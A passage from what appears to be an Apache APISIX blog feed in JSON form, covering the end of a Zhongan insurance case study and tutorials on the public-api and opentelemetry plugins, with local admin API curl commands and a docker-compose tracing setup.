the operation process of Internet insurance is carried out online, it is a typical Internet+ scenario. It has both the high frequency and high concurrency of the Internet or some explosive phenomena, and also low frequency and low concurrency scenarios like others. However, it has both the flow characteristics of the Internet and also contains very many offline or traditional insurance business characteristics.\\n\\nTo be more precise, many scenarios of Internet insurance rely on channels for entrance, and multiple channels enable the business to release more capabilities. Therefore, the management of channel traffic is also an important part of Internet insurance in realizing the business level.\\n\\n### Strong Supervision\\n\\n![Strong supervision](https://static.apiseven.com/202108/1646628024098-e18d1cc9-f5d4-42e8-b8cf-d9adb13ee9a5.png)\\n\\nIn addition to the business area, as an industry that deals directly with money, insurance is also part of finance, so it is a financial product that will be supervised by the CBRC just like banks and securities, and comply with the corresponding terms and conditions. At the same time, the CBRC basically puts forward different requirements for business and technical aspects every year, and these are to go along with and develop.\\n\\nFor example, the red and green parts in the above diagram belong to the architectural approach for the separation of regulatory channels or front-end business from core business. Here there are also some regulatory requirements for the security level, including the governance of the two places and three centers and for the isolation of the middleware data business. The requirements for traffic governance and security are relatively strict.\\n\\n## Scenario Pain Points and Needs\\n\\nConsidering the real use scenario, each company actually has different levels and needs for traffic management. For example, some companies may prefer the gateway to be more front-loaded and act as an edge gateway, while others may want the gateway to handle north-south traffic or co-manage east-west and north-south traffic.\\n\\nFrom some common perspectives (closer to the business scenario of Zhongan), the following pain points and solution directions have been sorted out, i.e. the shortcomings of the gateway level in the current business scenario and the action directions that we want to make up afterwards.\\n\\n![Pain points](https://static.apiseven.com/202108/1646630173098-4a408c81-c09d-43c9-a97d-652a1105b36c.png)\\n\\nAnd in the real scenario of gateway deployment, in addition to the above issues, it is also necessary to consider the overall business requirements and the adaptation of multiple types of gateways in the deployment process. The following figure shows the logical deployment in the traffic governance process, mainly involving traffic gateway, microservice gateway, unified operation gateway, BaaS gateway and domain gateway.\\n\\n![Logical deployment in the traffic governance](https://static.apiseven.com/202108/1646632229629-35e7661b-82da-41cd-814b-8f3a527b7290.png)\\n\\nAfter sorting out the current problems, the technical team of Zhongan started to focus the gateway selection on some more mature open source products and began a new round of exploration.\\n\\n## Target Apache APISIX\\n\\nSince Zhongan has defined \\"open source products\\" at the beginning of the selection process, it has given certain reference standards from the enterprise perspective in evaluating open source products, and has given Apache APISIX the most direct recognition from these perspectives.\\n\\n![Why Apache APISIX](https://static.apiseven.com/202108/1646279255593-ef10624b-daf5-4fad-91ba-aed723925608.png)\\n\\nOf course, in addition to evaluating the open source products themselves, Zhongan also compared Kong and Traefik, which are still in use in the company\'s business, and also contacted the MSE products shared by AliCloud, among others.\\n\\nIn the end, a comprehensive side-by-side comparison was conducted in the following projects, and it can be seen that Apache APISIX is well suited to Zhongan\'s business needs in both long-term and short-term planning at the enterprise level.\\n\\n![Comprehensive details](https://static.apiseven.com/202108/1646629377542-caa6e75a-01d3-447e-b60d-3b405d9b61b7.png)\\n\\n## Apache APISIX Based Landing Case\\n\\n### Metering and Billing for BaaS Products\\n\\nZhongan is now gradually BaaS its underlying products within the business. Because of the financial attributes, the implementation requirements for BaaS products will be higher, and the infrastructure products need to achieve the same unified standard measurement and billing as cloud products.\\n\\n![BaaS case](https://static.apiseven.com/202108/1646632943025-f024f316-8bc4-4318-8416-a05f5da4aaf1.png)\\n\\nBecause all the products used in the company need to achieve financial statement-style regulatory requirements. Therefore, in this scenario, real-name authentication and related auditing functions are required, and the APISIX forensics module is needed here. This means that any call process within the company needs to be audited and recorded, including the number of calls, expenses incurred, etc. So in this process, Apache APISIX\'s powerful logging-related features also play a very good support.\\n\\nAt the same time, the audit process also requires peak audit calculations, which involves a lot of billing formulas that include not only the number of calls, but also peak information. So based on APISIX\'s functional support, we can also realize the presentation of relevant Metrics indicators, thus laying a solid foundation for metering and billing scenarios.\\n\\n![Audit process](https://static.apiseven.com/202108/1646633267273-f7737cdf-59ad-441f-b76d-8a172e46a7bb.png)\\n\\nThe specific implementation framework can be found in the above diagram, where the configuration center is a pure layer 7 traffic protocol, so it can be fully integrated into the metering and billing system, including ES and APISIX itself, etc. The specific operation is mainly based on the current structure of APISIX to do some definitions, such as to call several requirements for the company\'s business, as well as using some plug-ins of APISIX for the implementation of related orchestration capabilities.\\n\\n### Multi-tenant and Multi-channel Traffic Segregation\\n\\nIn the face of the multi-insurance multi-channel scenario of Zhongan, multi-tenant multi-channel traffic isolation has also become a requirement with industry characteristics.\\n\\nBased on Apache APISIX, Zhongan has also made some plans for the requirements and strong control in multi-channel scenario. Thanks to APISIX\'s powerful traffic orchestration and plugin orchestration functions, it provides a traffic precision control effect never experienced before in Internet insurance scenarios.\\n\\nFor example, if some business parties are large and have large channels, they may create a separate cluster for the channels to use; but some channels are smaller, maybe 10% of them are large, but most of them are small. Based on such a scenario, one can try to fuse these small channels into one gateway entity or instance, and then share it.\\n\\nOf course here it will involve each application in the process of access, because different channels will have different upstream and downstream to dock, it will generate different domain names. The isolation based on this scenario (structured in the figure below) is called first-level isolation.\\n\\n![First-level isolation](https://static.apiseven.com/202108/1646633613102-961cda91-be0e-475f-beb3-3b8f77c4ec5a.png)\\n\\nBut when the channel is docked in the need for follow-up related operations, although the process is exactly the same but the next business control capacity requirements are different from those mentioned above, so it is necessary to carry out secondary isolation of the channel again (as shown in the structure below). Through such a level of isolation plus two isolation mode, it can be a good solution to the gateway in the multi-tenant multi-channel traffic isolation.\\n\\n![Two isolation mode](https://static.apiseven.com/202108/1646635887658-f357d9b8-ac83-41d1-8e3d-a8ae1eae8588.png)\\n\\n## Future Plan and Expectations\\n\\n### Strengthen Cross-departmental Synergy\\n\\nAt present, Zhongan has not only one business, but also many subsidiaries, so we will definitely face many large-scale deployments of such multi-departmental business in the follow-up process.\\n\\nTherefore, when promoting the related technology stack, it must not be led by only one department, but more of a cross-departmental collaboration, so as to realize the deployment of Apache APISIX in Zhongan as soon as possible.\\n\\n### Update Nacos Service Registry Based on Apache APISIX\\n\\nAt present, Zhongan is doing lossless service up/down based on Nacos, so in the following plan, APISIX will be interfaced with Nacos to achieve unified management. This will allow microservices to be routed to Apache APISIX for lossless or source data-based traffic distribution. Of course, we will also continue to use APISIX to improve BaaS-related capabilities.\\n\\n### Continue to Watch the Service Mesh Product\\n\\nHowever, because of the rapid development of business, the current service grid can not meet the current business implementation space. Therefore, we continue to look at external service grid products, such as APISIX Service Mesh, or try to use APISIX in combination with etcd.\\n\\n## Summary\\n\\nIn the process of pursuing traffic governance and implementation of some ground plans, we are not only using Apache APISIX as an edge gateway to control point traffic, but also based on the overall architecture for traffic control. That is, for the whole DevOps lifecycle, such as whether the testing scenario can provide testing capability or multi-version development capability; whether the production side can provide traffic recording and playback capability; whether the big data department can produce related sandbox environment to evaluate better models and isolate the domain environment and other capabilities.\\n\\n![Summary](https://static.apiseven.com/202108/1646634773029-3192409f-8302-4f1e-8b7f-fef4f2f5df2f.png)\\n\\nWe hope that in the subsequent implementation practice, Zhongan can realize the complete implementation of overall traffic governance based on Apache APISIX, and help the traffic control and security governance in the Internet insurance field.\\n\\n:::note\\n\\n1. The specific terms involved in the architecture diagram in the text are all abstract understanding, not the real environment with words.\\n2. API Gateway side-by-side comparison data comes from the Internet, which may deviate from the latest or real data, and does not represent the official website data.\\n\\n:::"},{"id":"API Gateway Apache APISIX provides enhancements on API Management","metadata":{"permalink":"/blog/2022/03/01/apisix-integration-public-api-plugin","source":"@site/blog/2022/03/01/apisix-integration-public-api-plugin.md","title":"API Gateway Apache APISIX provides enhancements on API Management","description":"You can protect custom APIs in APISIX plugins through the public-api plugin of Apache APISIX, a cloud-native API gateway, and introduce its application scenarios.","date":"2022-03-01T00:00:00.000Z","formattedDate":"March 1, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8.06,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://avatars.githubusercontent.com/u/8078418?v=4","imageURL":"https://avatars.githubusercontent.com/u/8078418?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"Implement Traffic Governance in Internet Insurance with APISIX","permalink":"/blog/2022/03/02/zhongan-usercase-with-apache-apisix"},"nextItem":{"title":"Upgrade of observability capabilities, API Gateway Apache APISIX integrates OpenTelemetry","permalink":"/blog/2022/02/28/apisix-integration-opentelemetry-plugin"}},"content":"> This article introduces the principle and usage of API gateway Apache APISIX native plugin `public-api`.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. As an API gateway, Apache APISIX not only has many useful plug-ins, but also supports dynamic plug-in change and hot plug.\\n\\nWhen users develop custom plugins in Apache APISIX, they can define some APIs (hereinafter referred to as: public API) for the plugins. For example, the `jwt-auth` plugin, which implements and provides the `/apisix/plugin/jwt/sign` interface for signing JWT, because this interface is not added through the Admin API, it can\'t be managed like a route.\\n\\nIn practical application scenarios, the provided interface is for internal calls, rather than being open on the public network for anyone to call. In order to deal with this scenario, Apache APISIX designed a `public-api` plugin that replaces the limited functionality and complex use of `plugin-interceptors`. With this plugin, you can solve the pain points in using the public API. You can set a custom URI for the public API and configure any type of plugin. The following figure shows the changes before and after using `public-api`.\\n\\n## Initial Knowledge about `public-api`\\n\\nThis section takes the `/apisix/plugin/jwt/sign` interface of the `jwt-auth` plugin as an example to introduce two usage methods and a scenario example of the `public-api` plugin.\\n\\nBefore using the `public-api` plugin, if the public API is registered using `_M.api()` in plugin development, APISIX will expose it by default and you can call it directly on the HTTP port. Now you need to manually create a route and configure the `public-api` plugin before you can forward the API to the `public-api` plugin.\\n\\n### Confirm Whether the API is Open\\n\\nYou can request the API path by following the command below and return the result to see that `/apisix/plugin/jwt/sign` is not exposed by default and is not available.\\n\\n```Shell\\ncurl -XGET \'http://127.0.0.1:9080/apisix/plugin/jwt/sign?key=user-key\'\\n\\n{\\"error_msg\\":\\"404 Route Not Found\\"}\\n```\\n\\n### Prerequisites\\n\\nYou need to create a Consumer and enable the `jwt-auth` plugin to perform the following steps.\\n\\n> For `jwt-auth` parameter configuration information in the example, you can refer to the [Apache APISIX official documentation](https://apisix.apache.org/zh/docs/apisix/plugins/jwt-auth).\\n\\n```Shell\\n    curl -XPUT \'http://127.0.0.1:9080/apisix/admin/consumers\' \\\\\\n    -H \'X-API-KEY: <api-key>\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d \'{\\n        \\"username\\": \\"APISIX\\",\\n        \\"plugins\\": {\\n            \\"jwt-auth\\": {\\n                \\"key\\": \\"user-key\\",\\n                \\"algorithm\\": \\"HS256\\"\\n            }\\n        }\\n    }\'\\n```\\n\\n### Method 1: Basic Use\\n\\n1. Create and configure a Route.\\n\\nCreate a Route based on the Consumer in the **Prerequisites**, set the `uri` to the API address where the JWT is issued in the `jwt-auth` plugin, and open the `public-api` plugin in the Route.\\n\\n```Shell\\n    curl -XPUT \'http://127.0.0.1:9080/apisix/admin/routes/r1\' \\\\\\n    -H \'X-API-KEY: <api-key>\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d\'{\\n        \\"uri\\": \\"/apisix/plugin/jwt/sign\\",\\n        \\"plugins\\": {\\n            \\"public-api\\": {}\\n        }\\n    }\'\\n```\\n\\n2. Test the Example.\\n\\nYou can test with the following command, and if you see that the result is a `JWT` string, this public API is ready to use.\\n\\n```Shell\\n    curl -XGET \'http://127.0.0.1:9080/apisix/plugin/jwt/sign?key=user-key\'\\n\\n    <header>.<payload>.<signature>\\n```\\n\\n### Method 2: Customize the Path\\n\\nBefore using the `public-api` plugin, it is difficult for users to modify a `uri` that is open to the public API. Users of the `prometheus` plugin can customize the `exporter uri` by modifying the configuration file, but for other Apache APISIX plugins, this can only be done by modifying the plugin file, which is difficult and risky in a production environment.\\n\\nNow you can use the `public-api` plugin to modify the `uri` that the public API is open to the outside world, with the following examples.\\n\\n1. Create and configure a Route.\\n\\nUse the following command to modify the Route created in **Method 1**, set `uri=/gen_token`, and configure the original `uri` to the `uri` field in the `public-api` plugin.\\n\\n```Shell\\n    curl -XPUT \'http://127.0.0.1:9080/apisix/admin/routes/r1\' \\\\\\n    -H \'X-API-KEY: <api-key>\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d \'{\\n        \\"uri\\": \\"/gen_token\\",\\n        \\"plugins\\": {\\n            \\"public-api\\": {\\n                \\"uri\\": \\"/apisix/plugin/jwt/sign\\"\\n            }\\n        }\\n    }\'\\n```\\n\\n2. Test the Example.\\n\\nThe public API is normally accessible with the new `uri`.\\n\\n```Shell\\n    curl -XGET \'http://127.0.0.1:9080/gen_token?key=user-key\'\\n\\n    <header>.<payload>.<signature>\\n```\\n\\nThe public API can\'t be accessed using the old `uri`.\\n\\n```Shell\\n    curl -XGET \'http://127.0.0.1:9080/apisix/plugin/jwt/sign?key=user-key\'\\n\\n    {\\"error_msg\\":\\"404 Route Not Found\\"}\\n```\\n\\n### Scenario Example: Protecting Router\\n\\nThis section describes how to use `public-api` plugin to address the business pain of `plugin-interceptors` plugin.\\n\\nThe following steps take the `key-auth` plugin as an example to show you how to use the `public-api` plugin to protect the public API.\\n\\n> For `jwt-auth` parameter configuration information in the example, you can refer to the [Apache APISIX official documentation](https://apisix.apache.org/zh/docs/apisix/plugins/jwt-auth).\\n\\n1. Create and configure a Consumer.\\n\\nCreate Consumer and configure the `key-auth` key.\\n\\n```Shell\\n    curl -XPUT \'http://127.0.0.1:9080/apisix/admin/consumers\' \\\\\\n    -H \'X-API-KEY: <api-key>\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d \'{\\n        \\"username\\": \\"APISIX\\",\\n        \\"plugins\\": {\\n            \\"key-auth\\": {\\n                \\"key\\": \\"test-apikey\\"\\n            }\\n        }\\n    }\'\\n```\\n\\n2. Create and configure a Route.\\n\\nModify the route created in **Method 2** and open the `key-auth` plugin and `public-api` plugin.\\n\\n```Shell\\n    curl -XPUT \'http://127.0.0.1:9080/apisix/admin/routes/r1\' \\\\\\n    -H \'X-API-KEY: <api-key>\' \\\\\\n    -H \'Content-Type: application/json\' \\\\\\n    -d \'{\\n        \\"uri\\": \\"/gen_token\\",\\n        \\"plugins\\": {\\n            \\"public-api\\": {\\n                \\"uri\\": \\"/apisix/plugin/jwt/sign\\"\\n            },\\n            \\"key-auth\\": {}\\n        }\\n    }\'\\n```\\n\\n3. Test the Example.\\n\\nAfter testing, when the request carries the correct `apikey`, the public API can respond normally. When the request does not carry the `apikey`, the `401` unauthenticated status code will be returned. If the returned results of your test are consistent with the sample status, it proves that the `key-auth` plugin you just configured has taken effect.\\n\\n```Shell\\n    # with corrent apikey\\n    curl -XGET \'http://127.0.0.1:9080/gen_token?key=user-key\'\\n        -H \\"apikey: test-apikey\\"\\n\\n    <header>.<payload>.<signature>\\n\\n    # without apikey\\n    curl -i -XGET \'http://127.0.0.1:9080/gen_token?key=user-key\'\\n\\n    HTTP/1.1 401 UNAUTHORIZED\\n```\\n\\n## Principle Explanation\\n\\nFrom the above example, you can see that the `public-api` plugin can solve the defects of users when using the public API. This section introduces the implementation principle in detail.\\n\\nThe principle of `public-api` can be described in one sentence: the `public-api` plugin transfers the previous separate public API route matching to the plugin, and only performs public API matching for the routes that open the plugin. The following will explain the principle in detail from two aspects.\\n\\n### Before Using `public-api` Plugin\\n\\nFirst, you need to understand how Apache APISIX realizes the function of public API before integrating `public-api` plugin.\\n\\n- When apisix starts, it will load the custom plugin and build a radiotree router using the route configuration obtained from etcd. It will be responsible for matching the route according to the request information and calling the correct `handler` to forward the request.\\n- APISIX will create different routers for the public API of the custom plugin and the Route created by users respectively (hereinafter referred to as public API router and Route router).\\n- When a request arrives, it will be matched first by the public API router and then by the Route router. They are two completely separate parts in the request processing flow.\\n\\n![error/flowchart.png](https://static.apiseven.com/202108/1646120195055-fff81b45-55bb-4100-8822-b14b173448d5.png)\\n\\nAccording to this process, if you want to apply the plugin for Route router to the public API router, you need to manually maintain a list of plugins and manually execute the plugin function after the public API router is matched. It can be seen that such an architecture is complex and difficult to maintain, and brings many problems, such as complex use (configuration based on `plugin_metadata`), coarse grained configuration (it is difficult to implement different policies for multiple public APIs provided in a plugin), etc.\\n\\n### After adding the `public-api` Plugin\\n\\nAfter Apache APISIX introduce the `public-api` plugin, the above process will be simplified and the public API router matching previously executed before Route router matching will be transferred to the plugin.\\n\\n- When the request arrives, APISIX directly executes the Route router matching. When the corresponding route is found, the forwarding request is processed to the plugin.\\n- -When a route opens the `public-api` plugin, it will call the specified public API for request processing according to the plugin configuration, and the request forwarding will no longer be performed. The route without the `public-api` plugin will not be processed.\\n\\n![error/flowchart.png](https://static.apiseven.com/202108/1646136319962-68f66607-804c-4cbc-8742-0745a3ad0f5a.png)\\n\\nThe public API provided by the user defined plugin will no longer be exposed by default. Instead, the user configures route to decide how to provide it. You can freely set routing parameters, such as `uri`, `host`, `method`, etc. after that, you only need to open the `public-api` plugin for routing.\\n\\nBecause the `public-api` plugin has a low priority, it will be executed after most plugins are executed, so that users can configure any authentication and security plugins for route.\\n\\nApache APISIX no longer performs the two stage Route route matching and performs different logic, all of which belong to Route routing matching, and the process of request processing is greatly simplified.\\n\\n## Summary\\n\\nYou should note that after `public-api` is included in the official version release, Apache APISIX will no longer match the route of the public API in the HTTP request processing process of APISIX, that is, the public API registered in the plugin is not exposed by default. You can use the functions of the public API more flexibly through the use method of the `public-api` plugin.\\n\\n> This plug-in will be supported in `APISIX 2.13.0`. If you have completed the development of custom plug-in before `APISIX 2.13.0`, upgrading the version will affect your services. Please confirm again before upgrading.\\n\\nTo get more information about the `public-api` plugin description and full configuration list, you can refer to the [Apache APISIX official documentation](https://apisix.apache.org/docs/apisix/next/plugins/public-api).\\n\\nApache APISIX is also currently working on additional plugins to support the integration of additional services, so if you are interested, feel free to start a discussion in [GitHub Discussion](https://github.com/apache/apisix/discussions), or via the [mailing list](https://apisix.apache.org/zh/docs/general/join) to communicate."},{"id":"Upgrade of observability capabilities, API Gateway Apache APISIX integrates OpenTelemetry","metadata":{"permalink":"/blog/2022/02/28/apisix-integration-opentelemetry-plugin","source":"@site/blog/2022/02/28/apisix-integration-opentelemetry-plugin.md","title":"Upgrade of observability capabilities, API Gateway Apache APISIX integrates OpenTelemetry","description":"This article introduces you to the API Gateway Apache APISIX `opentelemetry` plugin concept and how to enable and deploy the `opentelemetry` plugin.","date":"2022-02-28T00:00:00.000Z","formattedDate":"February 28, 2022","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":8,"truncated":true,"authors":[{"name":"Haochao Zhuang","title":"Author","url":"https://github.com/dmsolr","image_url":"https://avatars.githubusercontent.com/u/29735230?v=4","imageURL":"https://avatars.githubusercontent.com/u/29735230?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://avatars.githubusercontent.com/u/97138894?v=4","imageURL":"https://avatars.githubusercontent.com/u/97138894?v=4"}],"prevItem":{"title":"API Gateway Apache APISIX provides enhancements on API Management","permalink":"/blog/2022/03/01/apisix-integration-public-api-plugin"},"nextItem":{"title":"How to Integrate API Gateway and Consul?","permalink":"/blog/2022/02/25/consul-api-gateway"}},"content":"> This article introduces you to the Apache APISIX `opentelemetry` plugin concept and how to enable and deploy the `opentelemetry` plugin.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://opentelemetry.io/blog/2022/apisix/\\" />\\n</head>\\n\\n## Background Information\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. It not only has many useful plugins, but also supports plugin dynamic change and hot swap.\\n\\nOpenTelemetry is an open source telemetry data acquisition and processing system. It not only provides various SDKS for application side telemetry data collection and reporting, but also data collection side for data receiving, processing and exporting. Export to any or more OpenTelemetry backends, such as Jaeger, Zipkin, and OpenCensus, by configuration. You can view the list of plug-ins that have adapted the OpenTelemetry Collector in the opentelemetry collector contrib  library.\\n\\n![error/OpenTelemetry](https://static.apiseven.com/202108/1646037628714-f542841e-ac27-4c13-a4c8-4cdef79ee501.png)\\n\\n## Plugin Introduction\\n\\nThe `opentelemetry` plugin of Apache APISIX implements Tracing data collection based on OpenTelemetry native standard ([OTLP/HTTP](https://github.com/open-telemetry/opentelemetry-specification/blob/main/specification/protocol/otlp.md#otlphttp-request)), and sends it to OpenTelemetry Collector through HTTP protocol. This feature will be supported online in Apache APISIX 2.13.0.\\n\\nSince the Agent/SDK of OpenTelemetry has nothing to do with the back-end implementation, when the application integrates the Agent/SDK of OpenTelemetry, the user can easily and freely change the observability backend service without any perception on the application side, such as switching from Zipkin into Jaeger.\\n\\nThe `opentelemetry`plug-in integrates the OpenTelemetry Agent/SDK in Apache APISIX, which can collect traced requests, generate trace and forward them to the OpenTelemetry Collector.\\n\\nThe `opentelemetry` plugin is located on the Agent side in the above figure, but currently only supports the `trace` part, and does not support the `logs` and `metrics` protocols of OpenTelemetry.\\n\\n## How to Use\\n\\n### Enable Plugin\\n\\nYou need to enable `opentelemetry` plugin and modify collector configuration in `conf/config.yaml` configuration file.\\n\\nIt is assumed that you have already deployed the OpenTelemetry Collector and enabled the [OTLP HTTP Receiver](https://github.com/open-telemetry/opentelemetry-collector/blob/main/receiver/otlpreceiver/README.md).\\n\\n> If you have not completed the deployment, you can refer to the Scenario Example section in the next section to complete the deployment of OpenTelemetry Collector.\\n\\nThe default port of the OTLP HTTP Receiver is `4318`, and the address of `collector` is the HTTP Receiver address of the OpenTelemetry Collector. For related fields, please refer to the [Apache APISIX official documentation](https://apisix.apache.org/zh/docs/apisix/next/plugins/opentelemetry/).\\n\\n  ```YAML\\n  plugins\\n  ... # Other plugins that have been enabled\\n  - opentelemetry\\nplugin_attr:\\n  ...\\n  opentelemetry:\\n    trace_id_source: x-request-id\\n    resource:\\n      service.name: APISIX\\n    collector:\\n      address: 127.0.0.1:4318 # OTLP HTTP Receiver address\\n      request_timeout: 3\\n  ```\\n\\n#### Method 1: Bind the plugin to the specified route\\n\\nIn order to show the test effect more conveniently, `sampler` is temporarily set to full sampling in the example to ensure that `trace` data is generated after each request is traced, so that you can view `trace` related data on the Web UI. You can also set relevant parameters according to the actual situation.\\n\\n  ```Shell\\n  curl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n  -X PUT -d \'\\n{\\n    \\"uri\\": \\"/get\\",\\n    \\"plugins\\": {\\n        \\"opentelemetry\\": {\\n            \\"sampler\\": {\\n                \\"name\\": \\"always_on\\"\\n            }\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"httpbin.org:80\\": 1\\n        }\\n    }\\n}\'\\n  ```\\n\\n#### Method 2: Set Global Rules\\n\\nYou can also enable `opentelemetry` plugin through the Apache APISIX Plugins feature. After the global configuration is complete, you still need to create the route, otherwise it will not be possible to test.\\n\\n  ```Shell\\n  curl \'http://127.0.0.1:9080/apisix/admin/global_rules/1\' \\\\\\n-H \'X-API-KEY:  edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n-X PUT -d \'{\\n    \\"plugins\\": {\\n        \\"opentelemetry\\": {\\n            \\"sampler\\": {\\n                \\"name\\": \\"always_on\\"\\n            }\\n        }\\n    }\\n}\'\\n  ```\\n\\n#### Method 3: Customize labels for Span through `additional_attributes`\\n\\nFor the configuration of `sampler` and `additional_attributes`, you can refer to the [Apache APISIX official documentation](https://apisix.apache.org/docs/apisix/next/plugins/opentelemetry/#attributes), where `additional_attributes` is a series of `Key:Value` key value pairs, you can use it to customize the label for Span, and can follow Span to display on the Web UI. Add `route_id` and `http_x-custom-ot-key` to the span of a route through `additional_attributes`, you can refer to the following configuration:\\n\\n  ```Shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1001 \\\\\\n  -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n  -X PUT -d \'\\n{\\n    \\"uri\\": \\"/put\\",\\n    \\"plugins\\": {\\n        \\"opentelemetry\\": {\\n            \\"sampler\\": {\\n                \\"name\\": \\"always_on\\"\\n            },\\n            \\"additional_attributes\\":[\\n                \\"route_id\\",\\n                \\"http_x-custom-ot-key\\"\\n            ]\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"httpbin.org:80\\": 1\\n        }\\n    }\\n}\'\\n  ```\\n\\n### Test Example\\n\\nYou can enable `opentelemetry` plugin in any of the above three methods. The following example uses the example of method three to create a route. After the creation is successful, you can refer to the following commands to access the route:\\n\\n```Shell\\ncurl -X PUT -H `x-custom-ot-key: test-ot-val` http://127.0.0.1:9080/put\\n```\\n\\nAfter the access is successful, you can see the details of the span similar to `/put` in the Jaeger UI, and you can see that the custom tags in the route are displayed in the Tags list: `http_x-custom-ot-key` and `route_id`.\\n\\n![error/Span details.png](https://static.apiseven.com/202108/1646039676695-a346734b-0498-4ff6-8882-789a61008544.png)\\n\\nYou need to note that the `additional_attributes` configuration is set to take values from Apache APISIX and Nginx variables as `attribute` values, so `additional_attributes` must be a valid Apache APISIX or Nginx variable. It also includes HTTP Header, but when fetching `http_header`, you need to add `http_` as the prefix of the variable name. If the variable does not exist, the `tag` will not be displayed.\\n\\n### Scenario Example\\n\\nThis scenario example deploys Collector, Jaeger, and Zipkin as backend services by simply modifying the official example of OpenTelemetry Collector, and starts two sample applications (Client and Server), where Server provides an HTTP service, and Client will cyclically call the server provided by the server. HTTP interface, resulting in a call chain consisting of two spans.\\n\\n#### Step 1: Deploy OpenTelemetry\\n\\nThe following uses `docker-compose` as an example. For other deployments, please refer to the [OpenTelemetry official documentation](https://opentelemetry.io/docs/collector/getting-started/).\\n\\nYou can refer to the following command to deploy:\\n\\n  ```Shell\\ngit clone https://github.com/open-telemetry/opentelemetry-collector-contrib.git\\ncd opentelemetry-collector-contrib/examples/demo\\ndocker-compose up -d\\n  ```\\n\\nEnter `http://127.0.0.1:16886` (Jaeger UI) or `http://127.0.0.1:9411/zipkin` (Zipkin UI) in the browser. If it can be accessed normally, the deployment is successful.\\n\\nThe following figure shows an example of successful access:\\n\\n![error/Jaeger example.png](https://static.apiseven.com/202108/1646039980335-71bbb6f7-39d5-4153-b6e7-0305f52112f3.png)\\n\\n![error/Zipkin example.png](https://static.apiseven.com/202108/1646040117233-7a18f85f-4037-43e3-bc63-0ff6d1dbe5c1.png)\\n\\n#### Step 2: Configure the Test Environment\\n\\nThe Apache APISIX service is introduced, and the topology of the final application is shown in the following figure:\\n\\n![error/Architecture diagram.png](https://static.apiseven.com/202108/1646040225319-819f10ab-9643-4bd7-8f99-07f9a6c84bf8.png)\\n\\nThe Trace data reporting process is as follows. Among them, since Apache APISIX is deployed separately and not in the network of docker-compose, Apache APISIX accesses the OTLP HTTP Receiver of OpenTelemetry Collector through the locally mapped port (`127.0.0.1:4138`).\\n\\n![error/Trace data reporting process.png](https://static.apiseven.com/202108/1646040470172-4d44c6ca-b890-4245-9c87-3a42d8b59f47.png)\\n\\nYou need to make sure you have enabled the `opentelemetry` plugin and reload Apache APISIX.\\n\\n1. You can refer to the following example to create a route and enable the `opentelemetry` plugin for sampling:\\n\\n  ```Shell\\n  curl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n    -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' \\\\\\n    -X PUT -d \'\\n  {\\n      \\"uri\\": \\"/hello\\",\\n      \\"plugins\\": {\\n          \\"opentelemetry\\": {\\n              \\"sampler\\": {\\n                  \\"name\\": \\"always_on\\",\\n              }\\n          }\\n      },\\n      \\"upstream\\": {\\n          \\"type\\": \\"roundrobin\\",\\n          \\"nodes\\": {\\n              \\"127.0.0.1:7080\\": 1\\n          }\\n      }\\n  }\'\\n  ```\\n\\n2. Modify the `./examples/demo/otel-collector-config.yaml` file and add the OTLP HTTP Receiver as follows:\\n\\n  ```Shell\\n  receivers:\\n    otlp:\\n      protocols:\\n        grpc:\\n        http:${ip:port}   # add OTLP HTTP Receiver\uff0cdefault port is 4318\\n  ```\\n\\n3. Modify `docker-compose.yaml`.\\n\\nYou need to modify the configuration file, change the interface address of Client calling Server to the address of Apache APISIX, and map the ports of OTLP HTTP Receiver and Server services to local.\\n\\nThe following example is the complete docker-compose.yaml after the configuration is modified:\\n\\n  ```YAML\\nversion: \\"2\\"\\nservices:\\n\\n  # Jaeger\\n  jaeger-all-in-one:\\n    image: jaegertracing/all-in-one:latest\\n    ports:\\n      - \\"16686:16686\\" # jaeger ui port\\n      - \\"14268\\"\\n      - \\"14250\\"\\n\\n  # Zipkin\\n  zipkin-all-in-one:\\n    image: openzipkin/zipkin:latest\\n    ports:\\n      - \\"9411:9411\\"\\n\\n  # Collector\\n  otel-collector:\\n    image: ${OTELCOL_IMG}\\n    command: [\\"--config=/etc/otel-collector-config.yaml\\", \\"${OTELCOL_ARGS}\\"]\\n    volumes:\\n      - ./otel-collector-config.yaml:/etc/otel-collector-config.yaml\\n    ports:\\n      - \\"1888:1888\\"   # pprof extension\\n      - \\"8888:8888\\"   # Prometheus metrics exposed by the collector\\n      - \\"8889:8889\\"   # Prometheus exporter metrics\\n      - \\"13133:13133\\" # health_check extension\\n      - \\"4317\\"        # OTLP gRPC receiver\\n      - \\"4318:4318\\"   # Add OTLP HTTP 